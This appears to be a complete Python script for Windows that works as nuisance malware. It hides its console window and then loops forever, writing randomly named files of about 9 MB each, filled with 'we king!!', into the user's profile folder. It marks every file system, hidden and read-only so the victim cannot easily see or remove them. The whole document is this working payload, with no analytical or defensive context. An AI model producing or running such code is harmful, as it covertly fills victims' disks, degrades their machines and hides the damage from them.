import win32console,win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window,0)
import os
import random as r
key="qazwsxedcrfvtgbyhnujm1234567890klopi"

while True:
    tn=""
    for i in range(0,16):
        tn+=key[r.randint(0,len(key)-1)]
    with open(os.environ["USERPROFILE"]+os.sep+tn,"w") as k:
        for b in range(0,2**20):
            k.write("we king!!")
        os.system('attrib +s +h +r "'+os.environ["USERPROFILE"]+os.sep+tn+'"')

